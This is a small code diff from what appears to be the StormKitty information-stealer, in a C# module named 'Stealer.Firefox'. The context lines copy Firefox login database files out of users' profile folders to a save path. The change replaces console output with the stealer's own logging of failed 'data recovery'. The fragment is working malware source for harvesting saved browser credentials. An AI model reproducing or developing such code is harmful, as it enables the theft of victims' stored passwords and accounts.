@@ -29,7 +29,7 @@ namespace Stealer.Firefox
                         Firefox.cLogins.GetDBFiles(Paths.appdata + path + "\\Profiles\\", bSavePath);
                     }
                 }
-                catch (Exception ex) { Console.WriteLine(ex); }
+                catch (Exception ex) { StormKitty.Logging.Log("Firefox >> Failed to recover data\n" + ex); }
             }
         }
     }
